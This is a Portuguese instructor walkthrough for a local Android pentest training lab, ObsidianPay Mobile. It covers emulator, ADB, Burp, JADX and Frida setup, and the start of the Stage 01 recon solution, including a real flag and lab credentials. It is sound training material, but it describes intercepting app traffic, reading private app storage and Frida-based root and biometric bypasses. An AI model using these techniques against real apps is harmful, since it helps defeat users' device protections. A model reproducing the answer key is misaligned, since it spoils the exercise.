# WALKTHROUGH (Instrutor) — Lab 08: ObsidianPay Mobile

**Estado: Final — Fase 19**

Este documento contém a **resolução manual completa** do laboratório, do zero até
a conclusão da cadeia. Foi escrito para um **estagiário iniciante absoluto**, que
nunca usou Android Studio, emulador, ADB, Burp Suite, JADX nem Frida. Cada
ferramenta é apresentada **antes** de ser usada, e cada comando explica em qual
terminal roda, em qual diretório, o que faz e qual resultado esperar.

O guia cobre, em ordem operacional:

- preparação do backend;
- preparação do Android Studio;
- criação do emulador;
- instalação do app;
- configuração do API Host;
- configuração opcional do Burp;
- análise estática (JADX);
- análise dinâmica;
- ADB;
- Frida;
- obtenção das nove flags;
- submissão das flags;
- scoreboard;
- Final Operator Chain;
- troubleshooting.

> ## ⚠️ Aviso — material privado de instrutor
>
> - **Este arquivo contém todas as flags e a solução completa.**
> - **Não compartilhe** com o aluno que deve tentar o lab sem spoilers — para o
>   aluno existem o [README.md](./README.md) e o [STUDENT-GUIDE.md](./STUDENT-GUIDE.md).
> - As flags reais vivem **apenas** em `api/src/flags.js` e aqui. Nenhum documento
>   público (`README`, `STUDENT-GUIDE`, `docs/*`, `tools/*`, `android-app/README`)
>   contém `FLAG{`.
> - **Uso exclusivamente no laboratório local ObsidianPay** (`127.0.0.1:8102` /
>   emulador `10.0.2.2:8102`). Nada aqui deve ser usado contra aplicativos ou
>   sistemas reais de terceiros.

---

## Sumário

- [Parte 0 — Como ler este guia](#parte-0--como-ler-este-guia)
- [Parte 1 — Preparação completa](#parte-1--preparação-completa)
- [Parte 2 — Configuração do Burp Suite](#parte-2--configuração-do-burp-suite)
- [Parte 3 — Análise estática do APK (JADX)](#parte-3--análise-estática-do-apk-jadx)
- [Parte 4 — ADB para iniciantes](#parte-4--adb-para-iniciantes)
- [Parte 5 — Frida para iniciantes](#parte-5--frida-para-iniciantes)
- [Como submeter qualquer flag (modelo único)](#como-submeter-qualquer-flag-modelo-único)
- [Stage 01 — Mobile Recon](#stage-01--mobile-recon)
- [Stage 02 — Insecure Storage](#stage-02--insecure-storage)
- [Stage 03 — Exported Components](#stage-03--exported-components)
- [Stage 04 — WebView Bridge](#stage-04--webview-bridge)
- [Stage 05 — Device Trust](#stage-05--device-trust)
- [Stage 06 — Biometric Vault](#stage-06--biometric-vault)
- [Stage 07 — Network/Pinning](#stage-07--networkpinning)
- [Stage 08 — App Integrity](#stage-08--app-integrity)
- [Stage 09 — Final Operator Chain](#stage-09--final-operator-chain)
- [Troubleshooting geral](#troubleshooting-geral)
- [Apêndice A — Referência rápida (flags, endpoints, pontos)](#apêndice-a--referência-rápida-flags-endpoints-pontos)
- [Apêndice B — Histórico de construção do lab](#apêndice-b--histórico-de-construção-do-lab)

---

## Parte 0 — Como ler este guia

O caminho principal de cada stage usa **o aplicativo + Burp Suite + ADB + JADX +
Frida** (as ferramentas reais de um pentest mobile). O `curl` **não** é o caminho
principal. Quando o `curl` aparecer, estará sempre dentro de uma caixa rotulada:

- **“Diagnóstico do backend”** — confirmar que o servidor responde.
- **“Confirmação rápida (instrutor)”** — conferir um valor sem abrir o app.
- **“Alternativa sem APK”** — fazer o stage quando o app ainda não foi compilado.

Como o app **não** tem uma tela de submissão de flags, **a submissão de toda flag
é feita pelo Burp Repeater** (com `curl` apenas como confirmação de instrutor).
O modelo único de submissão está descrito na seção
[Como submeter qualquer flag](#como-submeter-qualquer-flag-modelo-único) e é
referenciado por todos os stages.

Vocabulário mínimo:

- **Backend / API:** o servidor Node.js do lab, em `http://127.0.0.1:8102`.
- **Host:** o seu computador (onde rodam Docker, Android Studio, Burp).
- **Emulador:** um celular Android virtual rodando no host.
- **`10.0.2.2`:** dentro do emulador, é o apelido para o `127.0.0.1` do host.
- **Token:** credencial de sessão devolvida no login. Formato:
  `obsidian-mobile-token-guest-1001`.

---

## Parte 1 — Preparação completa

> Faça esta parte **uma vez** antes de começar os stages. Ao final dela você terá:
> backend no ar, Android Studio aberto, emulador ligado, app instalado, API Host
> configurado, login funcionando e a pasta de evidências pronta.

### 1. Clonar ou atualizar o repositório

1. Abra um terminal no seu computador (no Windows, recomenda-se o terminal do
   Ubuntu/WSL; no Linux/macOS, qualquer terminal).
2. Se ainda não tem o repositório, clone-o; se já tem, apenas atualize.
3. Entre na raiz do repositório:
   ```bash
   cd ~/ctf-labs
   ```
4. Garanta que está na branch correta do Lab 08:
   ```bash
   git checkout lab-08-mobile-obsidianpay
   ```
5. Atualize a branch:
   ```bash
   git pull
   ```
6. Confira o estado da árvore:
   ```bash
   git status
   ```
   - **Resultado esperado:** “working tree clean” (ou apenas mudanças que você
     mesmo fez). Arquivos `validate-phase*.sh` aparecendo como modificados sem
     mudança de conteúdo são **apenas ruído de permissão** do mount Windows/WSL —
     pode ignorar.
7. (Opcional) Veja o último commit para confirmar a fase:
   ```bash
   git log --oneline -1
   ```

> **Erro comum:** `git checkout` falha dizendo que há mudanças locais. Rode
> `git stash` para guardá-las temporariamente, faça o checkout e depois decida o
> que fazer com o stash.

### 2. Subir o backend

O backend roda em container Docker. Ele precisa estar **ligado** em praticamente
todos os stages.

1. No mesmo terminal, entre na pasta do lab:
   ```bash
   cd ~/ctf-labs/lab-08-obsidianpay
   ```
2. Confira que o `docker-compose.yml` é válido e mapeia a porta certa:
   ```bash
   docker compose config
   ```
   - **O que observar:** o serviço deve expor a porta `8102`.
3. Suba o backend, construindo a imagem:
   ```bash
   docker compose up --build
   ```
   - **O que faz:** constrói a imagem Node.js e inicia o servidor.
   - **Resultado esperado:** linhas como
     `ObsidianPay Mobile API (1.0.0) listening on http://0.0.0.0:8102`.
   - **Deixe este terminal aberto** — ele mostra os logs de cada requisição. Não
     feche enquanto estiver usando o lab. (Se preferir rodar em segundo plano, use
     `docker compose up --build -d`.)
4. Abra um **segundo terminal** (o primeiro está ocupado com os logs).
5. Confira a saúde do serviço pelo **navegador** do host: acesse
   `http://127.0.0.1:8102/health`.
   - **Resultado esperado:** um JSON com
     `{"status":"ok","name":"ObsidianPay Mobile","expectedPort":8102, ...}`.
6. Confirme que o container está “Up” / healthy:
   ```bash
   docker compose ps
   ```
7. Veja os logs quando precisar depurar:
   ```bash
   docker compose logs --tail=50
   ```
8. Para **desligar e resetar** (o placar/estado da cadeia ficam em memória e
   zeram ao reiniciar):
   ```bash
   docker compose down
   docker compose up --build -d
   ```

> **Diagnóstico do backend (curl):** se o navegador não abrir, confirme por linha
> de comando:
> ```bash
> curl -s http://127.0.0.1:8102/health
> ```
> Deve retornar o mesmo JSON de saúde.

**Erros comuns:**

- **Porta 8102 ocupada:** `ss -ltnp | grep 8102` (ou `lsof -i :8102`), encerre o
  processo concorrente, e suba de novo.
- **Backend não sobe / imagem velha:** `docker compose down` e depois
  `docker compose up --build` novamente; leia o log do container.
- **Docker indisponível:** se houver Node.js no host, dá para rodar direto
  (`node api/src/server.js`) a partir da pasta do lab; a porta continua `8102`.

### 3. Abrir o Android Studio

O app Android está em `android-app/`. Você vai **abrir apenas essa pasta** no
Android Studio (não a raiz do repositório).

1. Abra o **Android Studio**.
2. Menu **File > Open**.
3. Navegue até `~/ctf-labs/lab-08-obsidianpay/android-app` e selecione **apenas a
   pasta `android-app`**. Clique em **OK**.
4. Aguarde o **Gradle Sync** terminar (barra de progresso no rodapé). A primeira
   vez baixa dependências e pode demorar alguns minutos.
5. Configure o SDK e o JDK, se solicitado:
   - **JDK 17** (Android Studio recente já traz um JDK embutido — use o JDK do
     próprio Android Studio se estiver em dúvida).
   - **Android SDK Platform 34** e **Build-Tools** (o Android Studio oferece
     instalar o que faltar; aceite).
6. O Android Studio cria/atualiza o arquivo `local.properties` apontando para o
   SDK (`sdk.dir=...`). **Não comite o `local.properties`** — ele é específico da
   sua máquina (já é ignorado pelo `.gitignore` do projeto).

**Erros comuns:**

- **“SDK location not found”:** abra **Tools > SDK Manager**, instale o **Android
  14 (API 34)** e deixe o Android Studio gravar o `local.properties`.
- **Gradle Sync falha por versão de JDK:** em **Settings > Build, Execution,
  Deployment > Build Tools > Gradle**, selecione o **Gradle JDK 17**.
- **Sync lento/“travado”:** aguarde; a primeira sincronização baixa muita coisa.
  Veja `docs/ANDROID-BUILD-CHECKLIST.md` para a seção “Erros comuns de build”.

### 4. Criar o emulador

O emulador é um celular Android virtual. Você precisa dele ligado para instalar e
usar o app.

1. No Android Studio, abra **Tools > Device Manager**.
2. Clique em **Create Device** (ou no ícone “+”).
3. Em **Phone**, selecione um **Pixel** (ex.: Pixel 6). Clique em **Next**.
4. Selecione uma **system image** Android (recomendado **API 34**; qualquer
   API ≥ 24 serve). Se aparecer “Download”, baixe a imagem e aguarde. Clique em
   **Next** e depois **Finish**.
5. De volta ao Device Manager, clique no botão **▶ (Play)** ao lado do dispositivo
   para iniciar o emulador.
6. Aguarde até ver a **tela inicial** (home screen) do Android. A primeira
   inicialização é lenta.
7. Confirme que o computador “enxerga” o emulador (ver Parte 4 para instalar o
   ADB):
   ```bash
   adb devices
   ```
   - **Resultado esperado:** uma linha como `emulator-5554   device`.

**Erros comuns:**

- **`adb devices` mostra `offline`:** aguarde o boot terminar; rode de novo.
- **`unauthorized`:** desbloqueie a tela do emulador e aceite o diálogo
  “Allow USB debugging”.
- **Emulador não inicia (HAXM/virtualização):** habilite a virtualização (VT-x/
  AMD-V) na BIOS, ou use uma imagem ARM/sem aceleração.

### 5. Compilar e instalar o app

Há dois caminhos: rodar pelo Android Studio (mais fácil) ou gerar o APK e
instalar por ADB.

**Caminho A — pelo Android Studio (recomendado):**

1. Menu **Build > Make Project** (compila sem instalar) para verificar que tudo
   compila.
2. Com o emulador ligado, clique em **Run ▶** (ou Shift+F10) e selecione o
   emulador como alvo. O Android Studio compila, instala e abre o app.

**Caminho B — gerar APK e instalar por ADB:**

1. Gere o APK de debug pela linha de comando, a partir de `android-app/`:
   ```bash
   cd ~/ctf-labs/lab-08-obsidianpay/android-app
   ./gradlew :app:assembleDebug
   ```
   - **Backend precisa estar ligado?** Não, para compilar não.
   - **Emulador precisa estar ligado?** Não, para compilar não.
   - **Resultado esperado:** “BUILD SUCCESSFUL”.
2. Localize o APK gerado:
   ```
   android-app/app/build/outputs/apk/debug/app-debug.apk
   ```
3. Com o emulador ligado, instale (o `-r` reinstala por cima):
   ```bash
   adb install -r app/build/outputs/apk/debug/app-debug.apk
   ```
   - **Resultado esperado:** “Success”.
4. Confirme que o pacote foi instalado:
   ```bash
   adb shell pm list packages | grep obsidianpay
   ```
   - **Resultado esperado:** `package:com.obsidianpay.mobile.debug` (o build de
     **debug** usa o sufixo `.debug` no applicationId).

> **Importante (build debug):** o `applicationId` do build debug é
> `com.obsidianpay.mobile.debug`. Já o **package base do código**, usado em
> nomes de classe, **authority do ContentProvider** e **actions** de
> Intent/Broadcast, é `com.obsidianpay.mobile` (sem sufixo). Preste atenção a
> essa diferença ao usar `adb am start -n <pacote>/.Classe` (usa o applicationId
> com `.debug`) versus a authority `com.obsidianpay.mobile.provider.notes` (fixa).

**Erros comuns:**

- **`gradlew: Permission denied`:** rode `chmod +x ./gradlew` (ou use
  `sh ./gradlew ...`).
- **`adb: no devices/emulators found`:** ligue o emulador antes (Parte 4).
- **`INSTALL_FAILED_UPDATE_INCOMPATIBLE`:** desinstale a versão antiga
  (`adb uninstall com.obsidianpay.mobile.debug`) e instale de novo.

### 6. Configurar o API Host

O app precisa saber **onde** está o backend.

1. **Por que `127.0.0.1` não funciona dentro do emulador?** Dentro do emulador,
   `127.0.0.1` é o loopback do **próprio Android virtual**, não do seu PC. O app
   tentaria falar consigo mesmo e falharia.
2. **A solução no emulador é `10.0.2.2`:** esse é o apelido fixo do emulador para
   o `127.0.0.1` do host. O app já vem com o padrão `http://10.0.2.2:8102`.
3. No app, abra a tela **API Host** (botão “API Host” na Home).
4. Confirme/salve a base URL `http://10.0.2.2:8102` (botão “Use Emulator
   Default” → “Save Base URL”).
5. Teste fazendo o login (passo 7). Se logar, o host está correto.
6. **Celular físico (alternativa):** num aparelho real, `10.0.2.2`/`127.0.0.1`
   **não** alcançam o PC. Descubra o IP do PC na LAN (ex.: `192.168.0.50`), e na
   tela **API Host** salve `http://192.168.0.50:8102`. O backend precisa estar
   acessível na rede.

### 7. Login inicial

1. Abra o app (deve estar na tela de **Login**).
2. A conta pública é **`guest` / `guest123`** (geralmente já vem pré-preenchida).
3. Toque em **Login / Entrar**.
   - **Resultado esperado:** o app entra na **Home** (carteira ObsidianPay).
4. Confirme no terminal do backend (logs) que chegou o login:
   - Você verá no log do `docker compose up` algo como
     `POST /api/mobile/login`.
5. Guarde mentalmente o token: o backend devolve
   `obsidian-mobile-token-guest-1001`. Você vai precisar dele para submeter flags
   (a seção de submissão explica como obtê-lo no Burp).

**Erros comuns:**

- **“invalid credentials”:** confira usuário/senha (`guest` / `guest123`).
- **App “sem conexão” / timeout:** API Host errado — volte ao passo 6 e confirme
  `http://10.0.2.2:8102`; confirme o backend no ar (Parte 1.2).
- **Logou mas telas vazias:** o backend pode ter sido reiniciado; refaça o login.

### 8. Preparar a pasta de evidências

Crie, **fora do controle de versão**, uma estrutura para guardar evidências de
cada stage. Sugestão (na pasta do lab há um diretório `evidence/` para isso):

```
evidence/
├── stage-01/
├── stage-02/
├── stage-03/
├── stage-04/
├── stage-05/
├── stage-06/
├── stage-07/
├── stage-08/
└── stage-09/
```

Para criar de uma vez (a partir da pasta do lab):

```bash
cd ~/ctf-labs/lab-08-obsidianpay
mkdir -p evidence/stage-0{1,2,3,4,5,6,7,8,9}
```

**O que salvar em cada pasta de stage:**

- screenshots das telas do app;
- requisições (request) e respostas (response) capturadas no Burp;
- comandos ADB executados e suas saídas do terminal;
- trechos relevantes do JADX (código/strings);
- logs do Frida (quando usado);
- a **flag** obtida;
- a **resposta do submit** (`accepted: true`, `pointsAwarded`, `totalScore`).

---

## Parte 2 — Configuração do Burp Suite

O **Burp Suite** é um proxy que fica **no meio** entre o app e o backend. Ele
permite **ver** (HTTP history), **modificar e reenviar** (Repeater) cada
requisição. É a ferramenta central do caminho principal deste lab.

> Esta parte é **opcional para alguns stages**, mas é o caminho recomendado para
> capturar e modificar requisições. Se você nunca usou Burp, siga na ordem.

### 2.1 Abrir o Burp e o proxy

1. Abra o **Burp Suite** (a edição Community basta).
2. Em **“Temporary Project”** → **Next** → **“Use Burp defaults”** → **Start
   Burp**.
3. Vá na aba **Proxy > Proxy settings** (ou **Proxy > Options** em versões
   antigas) e veja **Proxy listeners**. Por padrão há um listener em
   `127.0.0.1:8080`.
4. Para o **emulador** alcançar o Burp, o listener precisa escutar em **todas as
   interfaces**:
   - Edite o listener; em **Bind to address**, escolha **All interfaces** (ou
     adicione um listener em `0.0.0.0:8080`).
5. Descubra o **IP do seu PC na LAN** (o emulador chega no host por esse IP):
   ```bash
   ip addr | grep "inet "    # Linux
   ```
   Anote algo como `192.168.0.50`. (No emulador, você também pode usar o IP
   especial do host `10.0.2.2`, que aponta para o `127.0.0.1` do PC.)

### 2.2 Apontar o emulador para o Burp

Há duas formas; comece pela mais simples.

**Forma simples (proxy global do emulador via ADB):**

1. Com o emulador ligado, defina o proxy global apontando para o Burp:
   ```bash
   adb shell settings put global http_proxy 10.0.2.2:8080
   ```
   - **O que faz:** todo tráfego HTTP do emulador passa a ir para o Burp do host.
2. Para **desfazer** depois (voltar ao normal):
   ```bash
   adb shell settings delete global http_proxy
   adb shell settings put global http_proxy :0
   ```

**Forma alternativa (Wi-Fi do emulador):** em **Settings > Network & internet >
Internet > (rede) > Proxy**, escolha **Manual**, host `10.0.2.2`, porta `8080`.

### 2.3 HTTP x HTTPS e o certificado CA

- **Neste lab o tráfego é HTTP (cleartext)**, não HTTPS. Para HTTP **não é
  necessário** instalar o certificado CA do Burp — o tráfego aparece direto no
  **Proxy > HTTP history**.
- **Se algum dia o lab usar HTTPS:** seria preciso exportar o **CA do Burp**
  (Proxy settings → Import/Export CA certificate → DER) e instalá-lo no Android.
  Em Android 7+ (targetSdk ≥ 24), certificados de **usuário** não são confiáveis
  por padrão para o app — daí a necessidade de `network-security-config` com
  `<certificates src="user"/>`, ou de um hook Frida no TrustManager. **Isto é
  pano de fundo conceitual; não é necessário aqui.**
- **Certificate pinning:** se o app “pinasse” o certificado, mesmo com o CA
  instalado o Burp não veria o tráfego. Neste lab o pinning é **report-only /
  desabilitado** (ver Stage 07), então não bloqueia.

### 2.4 Confirmar que o tráfego chega no Burp

1. Deixe **Proxy > Intercept** em **Intercept off** (assim o tráfego flui sem
   travar o app).
2. No app, faça uma ação (ex.: re-login).
3. Vá em **Proxy > HTTP history**. Você deve ver linhas para o host
   `10.0.2.2:8102` (ex.: `POST /api/mobile/login`, `GET /api/mobile/config`).

### 2.5 Usar o Repeater (enviar, editar e reenviar)

O **Repeater** é onde você reenvia uma requisição com modificações — é assim que
vamos disparar checkpoints e **submeter flags**.

1. Em **HTTP history**, clique com o botão direito numa requisição → **Send to
   Repeater**.
2. Abra a aba **Repeater**.
3. Edite o que precisar:
   - **Headers:** adicione/edite linhas no topo (ex.:
     `X-Obsidian-Recon: mobile-config-review`).
   - **Corpo JSON:** edite o body (ex.: acrescentar um campo).
4. Clique em **Send**. A resposta aparece no painel direito.
5. Para um novo request “do zero”, você pode editar a linha de método/caminho
   (ex.: trocar `GET` por `POST` e o path), ou copiar um request existente.

### 2.6 Voltar o proxy ao normal

Ao terminar a sessão, **remova o proxy** do emulador (senão o app fica “sem
internet” quando o Burp estiver fechado):

```bash
adb shell settings put global http_proxy :0
```

**Troubleshooting do Burp:**

- **App “sem internet” depois de configurar o proxy:** o Burp está fechado ou o
  listener não escuta em todas as interfaces. Abra o Burp, ajuste o listener
  (2.1) ou remova o proxy (2.6).
- **Burp não recebe tráfego:** confirme o listener em `0.0.0.0:8080`, o proxy do
  emulador apontando para `10.0.2.2:8080`, e **Intercept off**.
- **“Certificate not trusted” / HTTPS falha:** este lab é HTTP; se ver isso, está
  tentando HTTPS — confirme a base URL `http://10.0.2.2:8102`.
- **Backend local não aparece no history:** confirme a base URL no app (API
  Host) e que o backend está no ar.
- **Firewall do host bloqueando:** libere a porta `8080` (Burp) no firewall do
  PC; em alguns ambientes o emulador chega ao host só por `10.0.2.2`.

---

## Parte 3 — Análise estática do APK (JADX)

**JADX** é um descompilador: ele transforma o APK de volta em código Java/Kotlin
legível. Use-o para **ler** o app (segredos, lógica de assinatura, manifest) sem
executá-lo.

> **Diferença entre o código do repositório e o APK descompilado:** o código-fonte
> em `android-app/.../java/...` é o original (Kotlin). O JADX mostra uma
> **reconstrução** a partir do APK compilado — nomes de variáveis podem mudar,
> mas a lógica e as **strings/constantes** (salt, IDs, paths) aparecem. No lab
> você pode confirmar o que vê no JADX contra o código-fonte real.

### 3.1 Abrir o APK no JADX

1. Localize o APK de debug:
   ```
   android-app/app/build/outputs/apk/debug/app-debug.apk
   ```
2. Abra o **JADX-GUI**.
3. Menu **File > Open** e selecione o `app-debug.apk`.
4. Aguarde a **indexação** terminar (necessária para a busca funcionar).
5. No painel esquerdo, expanda o pacote **`com.obsidianpay.mobile`**.

### 3.2 Onde olhar (classes-chave)

Use **Navigation > Text search** (ou Ctrl+Shift+F) para busca textual. Procure e
salve trechos destas classes/recursos:

| Classe / recurso | Pacote / caminho | O que você encontra |
|---|---|---|
| `Constants` | `util/Constants.kt` | `DEFAULT_BASE_URL = http://10.0.2.2:8102`, nome das SharedPreferences, chaves de storage, `PROVIDER_AUTHORITY`, paths de endpoints. |
| `HardcodedSecrets` | `security/HardcodedSecrets.kt` | Segredos **fragmentados**: client id (`obsidian-mobile-legacy-client`), salt (`obsidian-legacy-attestation-2026`), hint Base64, rotas internas. |
| `LegacyRequestSigner` | `security/LegacyRequestSigner.kt` | Assinatura = `sha1(username:deviceId:timestamp:salt)` e os headers `X-Obsidian-*`. |
| `WeakCrypto` | `security/WeakCrypto.kt` | Base64 / XOR / SHA-1 / MD5 (cripto fraca didática). |
| `AndroidManifest` | (raiz do APK) | Componentes **exportados** (Activity/Receiver/Provider), schemes de deep link. |
| `network_security_config` | `res/xml/network_security_config.xml` | Cleartext liberado para `10.0.2.2`/`127.0.0.1`/`localhost`. |
| `ObsidianSupportBridge` | `webview/ObsidianSupportBridge.kt` | Métodos `@JavascriptInterface` da bridge `ObsidianBridge`. |
| `RootDetector` / `EmulatorDetector` | `environment/` | Checagens de root/emulador (client-side). |
| `BiometricGate` / `LocalAuthState` | `auth/` | Scaffold de biometria; PIN fraco `0420`; estado de vault local. |
| `NativeGate` / `TamperCheck` | `integrity/` | Gate nativo opcional + checks de integridade (report-only). |
| `PinningPolicy` | `network/PinningPolicy.kt` | Modos de pinning (`disabled-local-lab`/`report-only`/`strict-scaffold`). |

### 3.3 Evidências a salvar

- Print do **AndroidManifest** com os componentes `exported="true"`.
- Print de `HardcodedSecrets` mostrando os fragmentos do salt/client id.
- Print de `LegacyRequestSigner` mostrando o esquema `sha1(...)`.
- Print do `network_security_config.xml`.

**Erros comuns:**

- **Busca não acha nada:** a indexação ainda não terminou — aguarde.
- **“Falha ao abrir APK”:** confirme que está abrindo o `app-debug.apk` correto
  e que o build terminou (Parte 1.5).

---

## Parte 4 — ADB para iniciantes

**ADB** (Android Debug Bridge) é a ferramenta de linha de comando que conversa
com o emulador/aparelho. Vem com o Android SDK (em
`~/Android/Sdk/platform-tools/adb`). Se `adb` não for reconhecido, adicione esse
diretório ao `PATH`.

> Em quase todos os comandos abaixo: o **emulador deve estar ligado**. O backend
> só precisa estar ligado quando o comando aciona algo que fala com a API.

| Comando | O que faz |
|---|---|
| `adb devices` | Lista dispositivos. Procure uma linha terminando em `device`. |
| `adb shell` | Abre um shell dentro do Android. (Saia com `exit`.) |
| `adb shell pm list packages \| grep obsidianpay` | Confirma o pacote instalado. |
| `adb shell pidof com.obsidianpay.mobile.debug` | Mostra o PID do app (se estiver rodando). |
| `adb logcat` | Mostra os logs do Android. Filtre com `\| grep -i obsidian`. |
| `adb shell am start -n <pkg>/.Classe -a <ACTION> --es chave valor` | Inicia uma Activity. |
| `adb shell am broadcast -a <ACTION> --es chave valor` | Envia um broadcast. |
| `adb shell content query --uri content://<authority>/<path>` | Consulta um ContentProvider. |
| `adb shell run-as <pkg> <comando>` | Roda comando como o app (acessa o storage privado em build **debuggable**). |
| `adb pull <caminho> <destino>` | Copia um arquivo do device para o host. |

**Como interpretar o `adb devices`:**

- `emulator-5554   device` → tudo certo.
- `emulator-5554   offline` → o boot não terminou; aguarde.
- `emulator-5554   unauthorized` → desbloqueie o emulador e aceite a autorização.

**`run-as` e builds debug:** o `run-as` só funciona em apps **debuggable** (é o
caso do `app-debug.apk`). Ele permite ler `shared_prefs/`, `databases/` e
`files/` do app sem root.

**Como sair do `adb shell`:** digite `exit` e Enter.

**Erros comuns:**

- **`adb: command not found`:** adicione `platform-tools` ao `PATH` ou chame o
  binário pelo caminho completo.
- **`more than one device/emulator`:** especifique com `adb -s emulator-5554 ...`.
- **`run-as: package not debuggable`:** você instalou um build release — use o
  `app-debug.apk`.

---

## Parte 5 — Frida para iniciantes

**Frida** é uma ferramenta de **instrumentação dinâmica**: ela injeta scripts no
processo do app **em execução** para observar/alterar métodos (hooks). Neste lab,
os scripts prontos ficam em `tools/frida/` e servem para **observar** os pontos de
bypass de forma controlada.

> **Uso restrito:** os scripts são exclusivos do pacote local
> `com.obsidianpay.mobile(.debug)` e do ambiente autorizado deste lab. Não devem
> ser usados contra apps reais.

### 5.1 Pré-requisitos honestos

- **Cliente Frida no PC:** instale com `pip install frida-tools` e confirme:
  ```bash
  frida --version
  ```
- **Frida Server no device:** para instrumentar um app, o Frida normalmente
  precisa de um **frida-server** rodando no Android, o que **exige root** (ou um
  emulador/imagem que permita) e a versão do server **compatível** com a do
  cliente. **Avise-se disto:** num emulador padrão sem root, talvez você não
  consiga rodar o frida-server — nesse caso, os stages que “poderiam” usar Frida
  têm um caminho equivalente via **Burp Repeater** (e é o que usamos como
  principal). **Não invente** um setup incompatível com o seu ambiente.
- Quando o frida-server estiver disponível e compatível, confirme o device:
  ```bash
  frida-ps -U
  ```

### 5.2 Localizar e rodar um script

1. Liste os scripts disponíveis:
   ```
   tools/frida/01-environment-bypass.js      # RootDetector / EmulatorDetector / EnvironmentRiskEngine
   tools/frida/02-biometric-vault-bypass.js  # LocalAuthState / BiometricGate
   tools/frida/03-network-pinning-observer.js# PinningPolicy / NetworkSecurityProfile / CertificatePinner
   tools/frida/04-integrity-native-bypass.js # NativeGate / TamperCheck
   tools/frida/05-webview-bridge-observer.js # WebView addJavascriptInterface / ObsidianSupportBridge
   ```
2. Inicie o app no emulador (manual ou via Frida).
3. Anexe o script ao app em execução (exemplo, ajuste o nome do pacote para o
   build debug):
   ```bash
   frida -U -n com.obsidianpay.mobile.debug -l tools/frida/02-biometric-vault-bypass.js
   ```
   - **O que faz:** carrega o script, que coloca hooks e imprime logs
     `[ObsidianPay Lab]` quando os métodos-alvo são chamados.
4. Para **interromper**, pressione `Ctrl+C` (ou digite `exit` no prompt do Frida).

### 5.3 Função de cada script (resumo)

- **01 — environment bypass:** observa/força os retornos de `RootDetector.check`,
  `EmulatorDetector.check` e `EnvironmentRiskEngine` (riskLevel).
- **02 — biometric vault bypass:** força `BiometricGate.canUseBiometric`,
  `LocalAuthState.validateFallbackPin` e `isVaultUnlocked` (apoia o Stage 06).
- **03 — network pinning observer:** observa `PinningPolicy` e
  `CertificatePinner.check` (apoia o Stage 07).
- **04 — integrity native bypass:** observa/força `NativeGate.getNativeGateStatus`
  e os checks de `TamperCheck` (apoia o Stage 08).
- **05 — webview bridge observer:** observa `addJavascriptInterface` e os métodos
  da `ObsidianSupportBridge` (apoia o Stage 04).

**Erros comuns (e o que significam):**

- **`Failed to spawn/attach: process not found`:** o app não está rodando, ou o
  nome do pacote está errado (use `com.obsidianpay.mobile.debug` no build debug).
- **`class not found` ao hookar:** o nome da classe/método mudou ou o app ainda
  não carregou a classe; rode a ação no app primeiro.
- **`version mismatch` / `unable to connect`:** a versão do `frida-server` no
  device não bate com a do cliente — instale a versão compatível.
- **`permission denied` / sem frida-server:** seu emulador não tem root/server —
  **use o caminho via Burp Repeater** descrito no stage correspondente.
- **`device not found`:** rode `adb devices`; ligue o emulador.

---

## Como submeter qualquer flag (modelo único)

O app **não** tem tela de submissão. Toda flag é submetida ao backend pelo
endpoint `POST /api/mobile/challenge/submit`, e o **caminho principal é o Burp
Repeater**. Faça isto **uma vez** para entender; cada stage só dirá “submeta a
flag (ver modelo)”.

**1. Obter o token (Bearer):**

- No **Burp > Proxy > HTTP history**, ache `POST /api/mobile/login` e veja a
  **resposta**: o campo `token` é `obsidian-mobile-token-guest-1001`.
- Esse token vai no header `Authorization: Bearer obsidian-mobile-token-guest-1001`.

**2. Montar o submit no Repeater:**

1. Pegue qualquer request autenticada do history (que já tenha o header
   `Authorization`) → **Send to Repeater**.
2. No Repeater, altere a **primeira linha** para:
   ```
   POST /api/mobile/challenge/submit HTTP/1.1
   ```
3. Garanta os headers:
   ```
   Host: 10.0.2.2:8102
   Authorization: Bearer obsidian-mobile-token-guest-1001
   Content-Type: application/json
   ```
4. Coloque o **corpo JSON** (trocando `stageId`, `flag` e `evidence`):
   ```json
   {"stageId":"stage-01-recon","flag":"FLAG{obsidianpay_mobile_recon_01}","evidence":"config + header X-Obsidian-Recon"}
   ```
5. **Send.**

**3. Interpretar a resposta:**

- **Sucesso:** `{"accepted":true,"stageId":"...","pointsAwarded":<pontos>,"totalScore":<acumulado>,"nextStageHint":"..."}`.
- **Flag errada:** `{"accepted":false,"message":"Flag inválida para este estágio."}` →
  confira o `stageId` e a flag exata (sem espaços).
- **Reenvio da mesma flag:** `duplicate:true`, `pointsAwarded:0` (idempotente — é
  esperado, não é erro).

**4. Conferir o progresso:**

- `GET /api/mobile/challenge/progress` (no Repeater, com o Bearer) → estado por
  estágio (`submitted`, `pointsAwarded`), `totalScore`, `finalUnlocked`.
- `GET /api/mobile/challenge/scoreboard` → `totalScore`, `solvedStages`,
  `totalStages`, `completionPercent`, `finalUnlocked`.

> **Confirmação rápida (instrutor) — curl.** O mesmo submit por linha de comando:
> ```bash
> TOKEN=obsidian-mobile-token-guest-1001
> curl -s -X POST http://127.0.0.1:8102/api/mobile/challenge/submit \
>   -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
>   -d '{"stageId":"stage-01-recon","flag":"FLAG{obsidianpay_mobile_recon_01}","evidence":"config recon header"}'
> ```

---

## Stage 01 — Mobile Recon

### Objetivo

Reconhecer o “contrato mobile” (a configuração pública que o app baixa do
servidor) e descobrir que o endpoint de **config** se comporta de forma diferente
quando recebe um header de **revisão de configuração**. Esse header destrava o
checkpoint de recon com a flag.

### O que deve estar aberto

- **Backend:** sim (ligado).
- **Emulador:** sim.
- **App:** sim (logado como `guest`).
- **Burp:** sim (caminho principal).
- **Terminal:** opcional (confirmação por curl).
- **JADX / Frida:** não necessários.

### Onde começar no aplicativo

1. Faça login no app (Home aparece).
2. O app baixa a configuração mobile durante o login/abertura da Home — você verá
   no Burp uma requisição **`GET /api/mobile/config`** para o host `10.0.2.2:8102`.

### Passo a passo manual

1. Deixe o **Burp** com **Intercept off** e o proxy do emulador ativo (Parte 2).
2. No app, faça **logout/login** (ou reabra a Home) para gerar a chamada de config.
3. No **Burp > Proxy > HTTP history**, localize **`GET /api/mobile/config`**.
4. Clique com o botão direito → **Send to Repeater**.
5. Na aba **Repeater**, observe a resposta atual: ela **não** tem o bloco
   `reconCheckpoint`.
6. Adicione, na lista de headers do request, a linha:
   ```
   X-Obsidian-Recon: mobile-config-review
   ```
7. Clique em **Send**.
8. Observe a resposta: agora ela contém um bloco `reconCheckpoint`.
9. Copie o valor de `reconCheckpoint.flag`.
